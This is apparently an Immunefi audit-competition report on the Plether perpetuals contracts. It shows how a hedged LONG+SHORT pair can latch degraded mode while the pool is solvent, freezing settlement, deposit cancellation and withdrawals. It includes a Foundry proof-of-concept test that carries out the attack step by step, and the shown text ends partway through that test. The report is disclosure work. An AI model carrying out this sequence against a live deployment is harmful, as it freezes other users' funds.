# \#98385 [SC-High] An unprivileged hedged position latches degraded mode while the pool is solvent, freezing LP settlement, pending-deposit cancellation and position-holders' withdrawals until the owner recapitalizes

**Submitted on Nov 7th 2026 at 15:11:48 UTC by @yesofcourse for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98385
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

A user holding a fully margined LONG and SHORT of equal size pays zero carry, yet the pair pins the engine's worst-case liability `L` to just under pool cash. After a routine ~1% price move the user closes part of the winning leg; because a close reserves only existing claims and not the surviving leg's `L`, the payout drives `P - C` below `L` and latches `degradedMode`, even though the pool is solvent at the current mark. On mainnet this lets any trader, for a recoverable capital outlay and a few thousand USDG in fees, freeze every LP epoch settlement, block a matured Junior deposit from being cancelled or activated, and block every open-position trader from withdrawing free settlement for at least 24 hours. The freeze is still in place 72 hours after the owner runs the documented recapitalize-and-clear runbook, because that runbook omits the `assignUnassignedAssets` step the state actually requires.

## Vulnerability Details

References are to commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, `packages/perps/`. Using the protocol's own terms (SECURITY.md:337-340): `P` = pool cash, `C` = trader claims, `E = max(P-C, 0)`, `L = max(longMaxProfit, shortMaxProfit)`.

Degraded mode is the pool's insolvency circuit breaker: when the pool can no longer cover its obligations it latches, freezing LP settlement, deposits and withdrawals until the owner restores solvency. The vulnerability is that the latch fires on a *worst-case* test, `P - C < L`, where `L` is what the pool would owe if price moved all the way to the price cap, not what the pool actually owes at the current mark. An unprivileged attacker can inflate `L` to almost the entire pool at zero ongoing cost by holding a fully margined, perfectly hedged LONG+SHORT pair, then trip the latch with one ordinary winning-leg close, while the pool is still fully solvent at the live price. The latch then freezes every other user's funds, and the owner's documented recovery does not actually release them, so one trader can freeze the pool at will and keep re-freezing it. The four mechanics this relies on are each confirmed in code below.

**The latch tests the worst case, not solvency.** `CfdEngine._enterDegradedModeIfInsolvent` (`CfdEngine.sol:1351-1369`) sets `degradedMode` after any close or liquidation (`:1320`, `:1344`) when `P - C < L` (`_availableCashForFreshPoolPayouts` `:865-871`; `_maxLiability` `:1044-1050`). `L` is the liability if price ran to the cap, not the value at the current mark. Clearing it (`clearDegradedMode` `:658-667`) is `onlyOwner` and needs `P - C >= L`; only `recapitalizePool` (`:632-650`) raises `P`.

**A close does not reserve the surviving leg's liability.** The winning-leg close pays from pool cash after reserving only claims (`CfdEnginePlanLib.sol:954-962`; `CashPriorityLib.reserveFreshPayouts` `:27-41`, reservation = `C`). The surviving side's `L` is not reserved, so a payout `X > E - L` pushes `P - C` below `L`.

**A hedged pair holds `L` at `E` for free.** A fully margined position has zero carry base (margin >= max profit). Opens are admitted while `E >= L + B` (`B` = the 0.25% settlement buffer), leaving `E - L` of only about `B`. The attacker therefore sits one small winning-leg close away from the latch at all times, at no holding cost.

**What the latch blocks.** `settleLpEpoch` reverts (`HousePool.sol:832`, `:1864-1870`); withdrawals revert for any account with a live position (`CfdEngineSettlementSidecar.sol:274-276`); a matured Junior deposit cannot be cancelled, because `TrancheVault.cancelPendingDeposit` (`:851-859`) has no degraded exception and reverts `DepositEpochAlreadyActive`.

**Attack (launch parameters from DEPLOYMENT.md; PoC pool Junior 1,000,000 + Senior 3,000,000 + seeds, depth `E` = 4,002,000 USDG; figures from the PoC run, 6-decimal USDG as whole units):**

1. An honest trader opens a 100,000 LONG; Alice (Junior) and Bob (Senior) queue full redemptions; Carol queues a 100,000 Junior deposit. The attacker opens a fully margined LONG and SHORT, each with max profit 3,992,000 (`L`), over three accounts (SHORT split 75% / 25%) through the real `OrderRouter`. Slack before the trigger: `E - L = 10,000`. Attacker capital is about 2x the hedged notional (~8.2M) and is recoverable.
2. The basket price rises 1%, through the normal `updateMarkPrice` path. No oracle manipulation is used.
3. The attacker closes the 75% SHORT slice. The pool pays `X = 17,305.9`, so `P = 3,984,694.1`, `L = 3,992,000`, and `L - E = 7,305.9`: `degradedMode` latches.
4. The pool is solvent at mark: LP equity at mark is 4,014,634.1 against 4,000,000 of principal, there is no terminal deficit, and trader claims are 0.
5. For 24 hours, every hourly `settleLpEpoch` reverts `HousePool__DegradedMode`; Carol's 100,000 stays escrowed with no shares and her cancel reverts; the honest trader's 399,947.5 of free settlement cannot be withdrawn (`CfdEngine__DegradedMode`); `clearDegradedMode` reverts `StillInsolvent`.

**The documented recovery does not clear it.** `recapitalizePool` only books the amount in `pendingRecapitalizationAssets` (`CfdEngine.sol:649-651`). On reconciliation `applyClaimantRecapitalizationIntent` (`HousePoolPendingPreviewLib.sol:111-140`) restores only a Senior shortfall below its high-water mark; there is none here, so the whole amount becomes `unassignedAssets`. `trancheDepositsAllowed` then returns false while unassigned or pending-claimant buckets are non-zero (`HousePool.sol:1100-1118`), `_settleLpEpoch` defers entries (`:908-912`), and `_emitLpEpochSettled` reverts `NoLpEpochProgress` (`:1183-1185`), rolling back its own reconcile so the bucket stays pending. Only the owner-only `assignUnassignedAssets` (`HousePool.sol:660-702`) clears it, and the runbook at SECURITY.md:1505-1510 does not list that step. Measured: after a generous recap (8,058.3) and `clearDegradedMode` in separate transactions, 72 consecutive hourly settles all revert `NoLpEpochProgress` and Carol's deposit is still frozen; it activates only once the owner also calls `assignUnassignedAssets(false, owner)`.

**A minimum recap is undone in the next block.** With `recapitalizePool(7,306.9)` + `clearDegradedMode` in separate transactions, the attacker closes the next slice (payout `X2 = 668.8` > slack 1.0) and the engine re-latches. Over 25 cycles at an unchanged 1.01 mark all 25 re-latched: the owner's first recap was 7,306.9 and each later one about 1.9 (7,352.8 total), against attacker slice payouts of about 1.9 per cycle. The docs set no recap size, so the runbook as written permits this minimum; a recap above the attacker's remaining winning-leg profit ends the loop at that price.

**Why this is more than "degraded mode exists".** The latch and its blocks are documented (SECURITY.md:340; ACCOUNTING_SPEC.md:1224-1229, :1294-1295). What is not: an unprivileged user can set and reset the latch at will while the pool is solvent at mark (the docs frame it as the response when a terminal transition reveals insolvency, SECURITY.md:27 / WHITEPAPER.md:43; here equity at mark is 4,014,634 against 4,000,000 of principal and `C = 0`); a matured deposit has no exit while latched (cancellation is documented only as "cancellable before maturity", SECURITY.md:878-886, and the gate has no degraded exception); and the step-by-step runbook (SECURITY.md:1505-1510) omits `assignUnassignedAssets`, so an owner who follows it exactly still leaves the deposit frozen at 72 hours.

## Impact Details

**Selected impact: Temporary freezing of funds for at least 24 hours (High).** Per the program, impact is assessed first and separately from feasibility, at the DEPLOYMENT.md release parameters the PoC uses.

| Who | What is frozen | Amount (PoC) | Duration | Attacker cost |
|---|---|---|---|---|
| Pending depositor (Carol) | Matured Junior deposit, no cancel or activation | 100,000 USDG | >=24 h measured; still frozen at 72 h after the documented recap+clear | whole-sequence net 21,585 USDG (about 0.54% of the 3,992,000 hedged notional per leg); 8,278 with no price move and no latch |
| Every open-position account | Free settlement cannot be withdrawn | honest trader 399,947.5 | same; ends only if the trader closes the position | same |
| Queued LP redemptions | `settleLpEpoch` makes no progress | 0 of 4,000,000 funded | same | same |
| Owner | Must inject capital to clear | min 7,305.9; 8,058.3 to avoid immediate re-latch; 4,017,305.9 to also fund redemptions | per episode | n/a |

Carol's 100,000 USDG is frozen for more than 24 hours with no further attacker action, and stays frozen for 72 hours even when the owner runs the documented recapitalize-and-clear runbook in full. That is the basis for the High selection. The ~1% move, the ~2x pool-depth capital and the slack condition are feasibility factors, which under the program's rule change the amount paid and not the severity.

The one material question is whether the owner can simply undo the freeze. They can, but only with a step the runbook does not contain. The documented recapitalize-and-clear procedure leaves the deposit frozen for the full 72 hours measured; release requires the additional owner-only `assignUnassignedAssets` call (or a single atomic bundle of recap, clear, assign and settle). An owner who follows the documentation exactly therefore keeps the funds frozen well past 24 hours, and each later price move lets the attacker re-freeze the pool while the pair stays open. We select High on this basis, and note Medium as the floor if the program treats the undocumented assign step as ordinary recovery and bounds the freeze by owner reaction time.

This is not a "Lack of liquidity" impact: the frozen funds are assets the pool holds, locked by a latch that an unprivileged attacker sets and keeps, not by thin liquidity. No privileged role is involved, and the protocol has no force-close lever to remove the attacker's pair.


## References

Repo at the pinned commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

- [CfdEngine.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1351): degraded-mode latch, clear, and liability (`_maxLiability`, `recapitalizePool`)
- [CfdEnginePlanLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L954): winning-leg close payout plan and open-admission buffer
- [CashPriorityLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CashPriorityLib.sol#L27): payout reserves claims only, not the surviving leg's liability
- [HousePool.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1100): settlement gate, `NoLpEpochProgress`, and `assignUnassignedAssets`
- [CfdEngineSettlementSidecar.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L274): withdrawal block while a position is live
- [TrancheVault.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L851): deposit-cancel gate (no degraded exception)
- [HousePoolPendingPreviewLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111): recap intent routes to unassigned assets
- Docs: [SECURITY.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L337), [ACCOUNTING_SPEC.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L1222), [WHITEPAPER.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L1335), [DEPLOYMENT.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md?plain=1#L123) (release parameters)


## Proof of Concept

## Proof of Concept

The test is self-contained: it imports only `BasePerpTest`, `src/` contracts and forge-std. The attacker's opens and closes, LP settlement and mark updates go through the real `OrderRouter`; owner actions call `CfdEngine`/`HousePool` directly. It reproduces the latch while solvent at mark, measures the 24-hour freeze of all three blocked flows, proves the documented runbook leaves the deposit frozen at 72 hours (and that only `assignUnassignedAssets` releases it), and measures a 25-cycle minimum-recap re-latch loop with no new price move.

Place the file at `packages/perps/test/perps/poc/degraded_latch/DegradedLatchWhileSolvent.t.sol` and run from `packages/perps`:

```
forge test --match-path 'test/perps/poc/degraded_latch/DegradedLatchWhileSolvent.t.sol' -vv
```

Result: `12 passed, 0 failed`. Key output lines (raw 6-decimal units):

```
E - L (slack before trigger) 10000013998
pool cash paid out by the slice-1 close, X 17305869913
degradedMode true
L - E after the close (raw shortfall) 7305855915
LP equity at mark after the close 4014634144085   (LP principal 4000000000000)
hourly settleLpEpoch calls that reverted DegradedMode 24
CAROL pending deposit still escrowed after 24h 100000000000
minimum owner recap to clear (L - E) 7305855915
slice-2 payout X2 668786981
owner generous recap 8058307985  -> no re-latch
hourly settle calls over 72h after recap+clear: ok 0 / reverted NoLpEpochProgress 72
CAROL pending deposit after 72h 100000000000
completed clear -> re-latch cycles 25 ; owner cumulative recap 7352805990 ; attacker cumulative slice payouts 47832720
LP redemptions funded by the full bundle 4000020000000 ; owner redemption funded afterwards 87398435675
attacker net cost 21585118146 ; no-move control 8278209384
```

Full test code:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Proof of concept: an unprivileged hedged LONG+SHORT pair latches CfdEngine degraded mode while the pool is still
// solvent at the current mark, which then freezes LP epoch settlement, free-settlement withdrawals of every account
// that holds an open position, and cancellation of pending deposits.
//
// Entry points used (no pranked-engine trades are used for the attack):
//   - LP funding: BasePerpTest _fundJunior/_fundSenior; LP redemption: TrancheVault.requestRedeem.
//   - Attacker opens/closes and the honest trader's open: OrderRouter.commitOrder -> OrderRouter.executeOrder.
//   - Mark moves: OrderRouter.updateMarkPrice. LP settlement: OrderRouter.settleLpEpoch (permissionless).
//   - Owner actions: CfdEngine.recapitalizePool / clearDegradedMode, HousePool.assignUnassignedAssets.
//
// Launch parameters (DEPLOYMENT.md "Initial release parameters"): vpiFactor 0.01e18, maxSkew 0.4e18, maint 10 bps,
// init 20 bps, fad 300 bps, baseCarry 500 bps, minBounty 1e6, bountyBps 10, keeperShare 5000, protocolShare 0,
// Senior limits 40M / 8000 bps. Scale: Junior 1M + Senior 3M LP deposits (+ 1k/1k test seeds).

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {console2} from "forge-std/console2.sol";

contract DegradedLatchWhileSolventTest is BasePerpTest {

    address internal constant ALICE = address(0xA11CE); // Junior LP, queues a full redemption
    address internal constant BOB = address(0xB0B); // Senior LP, queues a full redemption
    address internal constant CAROL = address(0xCA401); // new Junior depositor with a pending deposit
    address internal constant KEEPER = address(0xC0FFEE); // unprivileged settlement caller
    address internal constant HONEST_TRADER = address(0x401E57); // honest trader with an open LONG
    address internal constant ATK_L = address(0xA77A0001); // attacker account holding the LONG leg
    address internal constant ATK_S1 = address(0xA77A0002); // attacker account: SHORT slice 1 (75%)
    address internal constant ATK_S2 = address(0xA77A0003); // attacker account: SHORT slice 2 (25%)

    uint256 internal constant JUNIOR_ASSETS = 1_000_000e6;
    uint256 internal constant SENIOR_ASSETS = 3_000_000e6;
    uint256 internal constant ATTACKER_FUNDING = 4_300_000e6;
    uint256 internal constant HONEST_FUNDING = 400_000e6;
    uint256 internal constant HONEST_NOTIONAL = 100_000e6;
    uint256 internal constant CAROL_DEPOSIT = 100_000e6;
    uint256 internal constant LOT = 100e6; // one 100-token position quantum at basket price 1.00
    uint256 internal constant ENTRY = 1e8;
    uint256 internal constant MOVE_1_PCT = 1.01e8;
    uint256 internal constant DUST = 101e6;
    uint256 internal constant CHUNK_BPS = 500;

    uint256 internal attackerDeposits;
    uint256 internal aliceReqId;
    uint256 internal bobReqId;
    uint256 internal carolReqId;
    uint256 internal honestFreeSettlement;
    uint256 internal hedgedNotional;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    // ------------------------------------------------------------------
    // Helpers
    // ------------------------------------------------------------------

    function _sel(
        bytes memory err
    ) internal pure returns (bytes4 s) {
        if (err.length >= 4) {
            assembly ("memory-safe") {
                s := mload(add(err, 32))
            }
        }
    }

    function _posSize(
        address a
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(a);
    }

    function _posMaxProfit(
        address a
    ) internal view returns (uint256 mp) {
        (,,, mp,,,) = engine.positions(a);
    }

    /// @dev E = max(P - C, 0): pool cash net of trader claims.
    function _equityE() internal view returns (uint256) {
        uint256 p = pool.totalAssets();
        uint256 c = engine.totalTraderClaimBalanceAssets();
        return p > c ? p - c : 0;
    }

    /// @dev LP equity at the current mark: P - C - sum(trader unrealized PnL).
    function _lpEquityAtMark() internal view returns (int256) {
        return int256(pool.totalAssets()) - int256(engine.totalTraderClaimBalanceAssets()) - _unrealizedTraderPnl();
    }

    /// @dev commitOrder (account) -> executeOrder (account acting as the permissionless keeper).
    function _routerTrade(
        address acct,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal returns (bool filled) {
        uint256 sizeBefore = _posSize(acct);
        vm.prank(acct);
        uint64 id = router.commitOrder(side, size, margin, 0, isClose);
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(acct);
        router.executeOrder(id, data);
        uint256 sizeAfter = _posSize(acct);
        filled = isClose ? sizeAfter + size == sizeBefore : sizeAfter == sizeBefore + size;
    }

    /// @dev Fully margined open (margin = 102% of notional + 10 USDG, so margin exceeds max profit and the
    ///      position owes zero carry). A commit-time rejection halves the chunk and retries.
    function _attackOpen(
        address acct,
        CfdTypes.Side side,
        uint256 notionalAssets
    ) internal returns (uint256 filled) {
        while (notionalAssets >= LOT) {
            uint256 margin = (notionalAssets * 102) / 100 + 10e6;
            vm.prank(acct);
            try router.commitOrder(side, notionalAssets * 1e12, margin, 0, false) returns (uint64 id) {
                uint256 sizeBefore = _posSize(acct);
                bytes[] memory data = _mockPythUpdateData(ENTRY);
                vm.prank(acct);
                router.executeOrder(id, data);
                assertEq(_posSize(acct), sizeBefore + notionalAssets * 1e12, "open must fill via the Router");
                return notionalAssets;
            } catch {
                notionalAssets = (notionalAssets / 2) / LOT * LOT;
            }
        }
    }

    function _attackerBalance() internal view returns (uint256 b) {
        address[3] memory accts = [ATK_L, ATK_S1, ATK_S2];
        for (uint256 i; i < 3; ++i) {
            b += clearinghouse.balanceAssets(accts[i]) + settlementToken.balanceOf(accts[i]);
        }
    }

    function _fundAttacker(
        address a
    ) internal {
        _fundTrader(a, ATTACKER_FUNDING);
        attackerDeposits += ATTACKER_FUNDING;
    }

    function _openShort(
        uint256 amount,
        uint256 target,
        uint256 splitBps
    ) internal returns (uint256 filled) {
        uint256 toS1 = amount;
        if (splitBps < 10_000) {
            uint256 s1Cap = ((target * splitBps) / 10_000) / LOT * LOT;
            uint256 s1 = _posMaxProfit(ATK_S1);
            uint256 room = s1Cap > s1 ? s1Cap - s1 : 0;
            if (toS1 > room) toS1 = room;
        }
        if (toS1 > 0) filled += _attackOpen(ATK_S1, CfdTypes.Side.SHORT, toS1);
        if (filled == toS1 && amount > toS1) filled += _attackOpen(ATK_S2, CfdTypes.Side.SHORT, amount - toS1);
    }

    /// @dev Lock-step interleaving of fully margined LONG then matching SHORT chunks (each <= 5% of E, so the skew
    ///      stays far inside the 0.4 E cap) until no further LONG lot fits under the open-admission gate E >= L + B.
    function _occupy(
        uint256 splitBps
    ) internal returns (uint256 opens) {
        vm.pauseGasMetering();
        for (uint256 i; i < 80; ++i) {
            uint256 e = _equityE();
            uint256 target = ((e * 10_000) / 10_025) / LOT * LOT;
            uint256 cap = ((e * CHUNK_BPS) / 10_000) / LOT * LOT;
            uint256 longMax = _sideMaxProfit(CfdTypes.Side.LONG);
            bool progressed;
            if (longMax < target) {
                uint256 chunk = target - longMax;
                if (chunk > cap) chunk = cap;
                if (_attackOpen(ATK_L, CfdTypes.Side.LONG, chunk) > 0) {
                    progressed = true;
                    opens++;
                }
            }
            longMax = _sideMaxProfit(CfdTypes.Side.LONG);
            uint256 shortMax = _sideMaxProfit(CfdTypes.Side.SHORT);
            if (shortMax < longMax) {
                if (_openShort(longMax - shortMax, target, splitBps) > 0) {
                    progressed = true;
                    opens++;
                }
            }
            if (!progressed) break;
        }
        vm.resumeGasMetering();
    }

    /// @dev Attacker exit at `price`: interleaved LONG/SHORT closes of `chunkAssets` each.
    function _unwind(
        uint256 chunkAssets,
        uint256 price
    ) internal {
        vm.pauseGasMetering();
        address[2] memory shorts = [ATK_S1, ATK_S2];
        for (uint256 i; i < 200; ++i) {
            uint256 lSize = _posSize(ATK_L);
            uint256 c = chunkAssets * 1e12;
            if (lSize > 0) {
                uint256 cl = lSize < c ? lSize : c;
                assertTrue(_routerTrade(ATK_L, CfdTypes.Side.LONG, cl, 0, true, price), "LONG chunk close fills");
            }
            uint256 rem = c;
            for (uint256 j; j < 2 && rem > 0; ++j) {
                uint256 sSize = _posSize(shorts[j]);
                if (sSize == 0) continue;
                uint256 cs = sSize < rem ? sSize : rem;
                assertTrue(_routerTrade(shorts[j], CfdTypes.Side.SHORT, cs, 0, true, price), "SHORT chunk close fills");
                rem -= cs;
            }
            if (_posSize(ATK_L) == 0 && _posSize(ATK_S1) == 0 && _posSize(ATK_S2) == 0) break;
        }
        vm.resumeGasMetering();
    }

    /// @dev Permissionless LP settlement through the Router with a fresh mark; returns the revert selector.
    function _settleOnce() internal returns (bool ok, bytes4 sel) {
        bytes[] memory data = _mockPythUpdateData(engine.lastMarkPrice());
        vm.prank(KEEPER);
        try router.settleLpEpoch(data) {
            return (true, bytes4(0));
        } catch (bytes memory err) {
            sel = _sel(err);
        }
    }

    function _refreshMark(
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    function _fundedLp() internal view returns (uint256) {
        return seniorVault.claimableRedeemAssets(bobReqId, BOB) + juniorVault.claimableRedeemAssets(aliceReqId, ALICE);
    }

    function _warpToLiveMarket() internal {
        for (uint256 i; i < 24 * 4 && (engine.isOracleFrozen() || engine.isFadWindow()); ++i) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
        }
        assertFalse(engine.isOracleFrozen() || engine.isFadWindow(), "need a live market hour");
    }

    function _warpToEpochStart(
        uint256 epochId
    ) internal {
        uint256 t = pool.lpEpochStart(epochId);
        if (vm.getBlockTimestamp() < t) vm.warp(t);
    }

    function _logPool(
        string memory label
    ) internal view {
        console2.log(label);
        console2.log("   pool cash P                 ", pool.totalAssets());
        console2.log("   trader claims C             ", engine.totalTraderClaimBalanceAssets());
        console2.log("   max liability L             ", _maxLiability());
        console2.log("   E = P - C                   ", _equityE());
        console2.log("   degradedMode                ", engine.degradedMode());
    }

    // ------------------------------------------------------------------
    // Scenario setup
    // ------------------------------------------------------------------

    /// @dev LPs deposit, an honest trader opens a LONG, the attacker builds a fully margined hedged pair that fills
    ///      the open-admission headroom, LPs queue full redemptions, CAROL queues a Junior deposit, the redemption
    ///      epoch matures. Price is still ENTRY; nothing is degraded.
    function _setupHedgedPair() internal {
        _setSeniorCapacity(40_000_000e6, 8000);

        _fundJunior(ALICE, JUNIOR_ASSETS);
        _fundSenior(BOB, SENIOR_ASSETS);
        _fundAttacker(ATK_L);
        _fundAttacker(ATK_S1);
        _fundAttacker(ATK_S2);
        _fundTrader(HONEST_TRADER, HONEST_FUNDING);

        _warpToLiveMarket();
        console2.log("pool depth before the attack, E", _equityE());

        // Honest trader opens a fully margined LONG before the pair exists.
        assertGt(_attackOpen(HONEST_TRADER, CfdTypes.Side.LONG, HONEST_NOTIONAL), 0, "honest open filled");
        honestFreeSettlement = clearinghouse.balanceAssets(HONEST_TRADER);
        assertGt(honestFreeSettlement, 0, "honest trader keeps free settlement");

        _occupy(7500);

        // LP cooldown elapses, then both LPs request redemption of every share.
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _refreshMark(ENTRY);
        uint256 aShares = juniorVault.maxRequestRedeem(ALICE);
        uint256 bShares = seniorVault.maxRequestRedeem(BOB);
        vm.prank(ALICE);
        aliceReqId = juniorVault.requestRedeem(aShares, ALICE, ALICE);
        vm.prank(BOB);
        bobReqId = seniorVault.requestRedeem(bShares, BOB, BOB);

        // Attacker tops the pair up again after the request-time reconcile.
        _occupy(7500);
        hedgedNotional = _sideMaxProfit(CfdTypes.Side.LONG);

        // CAROL queues a Junior deposit.
        settlementToken.mint(CAROL, CAROL_DEPOSIT);
        vm.startPrank(CAROL);
        settlementToken.approve(address(juniorVault), CAROL_DEPOSIT);
        carolReqId = juniorVault.requestDeposit(CAROL_DEPOSIT, CAROL, CAROL);
        vm.stopPrank();

        // Both the redemption epoch and CAROL's deposit epoch mature.
        _warpToEpochStart(aliceReqId > bobReqId ? aliceReqId : bobReqId);
        _warpToEpochStart(carolReqId);
        _refreshMark(ENTRY);

        _logPool("== hedged pair in place, price 1.00, not degraded ==");
        console2.log("   LONG max profit             ", _sideMaxProfit(CfdTypes.Side.LONG));
        console2.log("   SHORT max profit            ", _sideMaxProfit(CfdTypes.Side.SHORT));
        console2.log("   E - L (slack before trigger)", _equityE() - _maxLiability());
        assertFalse(engine.degradedMode(), "not degraded before the price move");
    }

    /// @dev Basket rises 1%; the attacker closes SHORT slice 1 (the winning leg). Returns the pool cash paid out.
    function _moveAndLatch() internal returns (uint256 x) {
        _refreshMark(MOVE_1_PCT);
        uint256 p0 = pool.totalAssets();
        uint256 atk0 = _attackerBalance();
        assertTrue(
            _routerTrade(ATK_S1, CfdTypes.Side.SHORT, _posSize(ATK_S1), 0, true, MOVE_1_PCT), "slice-1 close fills"
        );
        x = p0 - pool.totalAssets();
        console2.log("pool cash paid out by the slice-1 close, X", x);
        console2.log("attacker balance change on slice 1 (net of fee)", _attackerBalance() - atk0);
        assertTrue(engine.degradedMode(), "a voluntary profitable close latches degraded mode");
    }

    /// @dev Mint USDG to the owner (this test contract) and recapitalize the pool.
    function _ownerRecap(
        uint256 amount
    ) internal {
        settlementToken.mint(address(this), amount);
        settlementToken.approve(address(engine), amount);
        engine.recapitalizePool(amount);
    }

    function _minRecapToClear() internal view returns (uint256) {
        uint256 e = _equityE();
        uint256 l = _maxLiability();
        return l > e ? l - e : 0;
    }

    /// @dev Total profit still realizable on the winning legs at the current mark (measured in a snapshot).
    function _remainingShortProfit() internal returns (uint256 profit) {
        uint256 snap = vm.snapshotState();
        uint256 p0 = pool.totalAssets();
        if (_posSize(ATK_S1) > 0) {
            _routerTrade(ATK_S1, CfdTypes.Side.SHORT, _posSize(ATK_S1), 0, true, engine.lastMarkPrice());
        }
        if (_posSize(ATK_S2) > 0) {
            _routerTrade(ATK_S2, CfdTypes.Side.SHORT, _posSize(ATK_S2), 0, true, engine.lastMarkPrice());
        }
        uint256 p1 = pool.totalAssets();
        profit = p0 > p1 ? p0 - p1 : 0;
        vm.revertToState(snap);
    }

    // ------------------------------------------------------------------
    // Test 1: how big a price move is needed
    // ------------------------------------------------------------------

    function test_triggerThresholdAroundOnePercent() public {
        _setupHedgedPair();
        uint256[3] memory marks = [uint256(1.005e8), uint256(1.0075e8), uint256(1.01e8)];
        bool[3] memory latched;
        for (uint256 i; i < 3; ++i) {
            uint256 snap = vm.snapshotState();
            _refreshMark(marks[i]);
            uint256 slack = _equityE() - _maxLiability();
            uint256 p0 = pool.totalAssets();
            assertTrue(
                _routerTrade(ATK_S1, CfdTypes.Side.SHORT, _posSize(ATK_S1), 0, true, marks[i]), "probe close fills"
            );
            latched[i] = engine.degradedMode();
            console2.log("probe mark (1e8)", marks[i]);
            console2.log("   E - L before close", slack);
            console2.log("   pool cash outflow X", p0 - pool.totalAssets());
            console2.log("   latched?", latched[i]);
            vm.revertToState(snap);
        }
        assertFalse(latched[0], "+0.5% does not latch");
        assertTrue(latched[2], "+1.0% latches");
    }

    // ------------------------------------------------------------------
    // Test 2: the latch while solvent, and what it freezes
    // ------------------------------------------------------------------

    function test_latchWhileSolventFreezesSettlementWithdrawalsAndDepositCancel() public {
        _setupHedgedPair();
        uint256 carolEscrowBefore = juniorVault.pendingDepositRequest(carolReqId, CAROL);
        assertEq(carolEscrowBefore, CAROL_DEPOSIT);

        _refreshMark(MOVE_1_PCT);
        int256 eqBefore = _lpEquityAtMark();
        console2.log("LP equity at mark before the close", eqBefore);
        uint256 slack = _equityE() - _maxLiability();
        console2.log("E - L before the close (slack)", slack);

        uint256 latchTime = vm.getBlockTimestamp();
        uint256 x = _moveAndLatch();
        assertGt(x, slack, "payout exceeds the slack E - L");

        // Solvent at mark: LP equity at mark is far above LP principal, no terminal deficit, no trader claims.
        int256 eqAfter = _lpEquityAtMark();
        _logPool("== after slice-1 close ==");
        console2.log("L - E after the close (raw shortfall)", _maxLiability() - _equityE());
        console2.log("LP equity at mark after the close", eqAfter);
        console2.log("LP principal deposited", JUNIOR_ASSETS + SENIOR_ASSETS);
        assertGt(eqAfter, int256(JUNIOR_ASSETS + SENIOR_ASSETS), "pool is solvent at mark, equity above principal");
        assertEq(pool.getPoolLiquidityView().currentTerminalDeficitAssets, 0, "no terminal deficit");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claims outstanding");

        // (1) LP epoch settlement reverts every hour for 24 hours; nothing is funded or activated.
        uint256 fundedBefore = _fundedLp();
        uint256 reverts;
        for (uint256 h; h < 24; ++h) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            (bool ok, bytes4 sel) = _settleOnce();
            assertFalse(ok);
            assertEq(sel, IHousePool.HousePool__DegradedMode.selector, "settleLpEpoch reverts DegradedMode");
            reverts++;
        }
        console2.log("hourly settleLpEpoch calls that reverted DegradedMode", reverts);
        console2.log("hours since latch", (vm.getBlockTimestamp() - latchTime) / 1 hours);
        console2.log("LP redemptions funded, before / after 24h", fundedBefore, _fundedLp());
        assertLe(_fundedLp(), DUST, "no LP redemption is funded while latched");
        assertTrue(engine.degradedMode(), "still latched after 24h");

        // (2) CAROL cannot cancel her matured pending deposit and it is not activated: her USDG sits in escrow.
        vm.prank(CAROL);
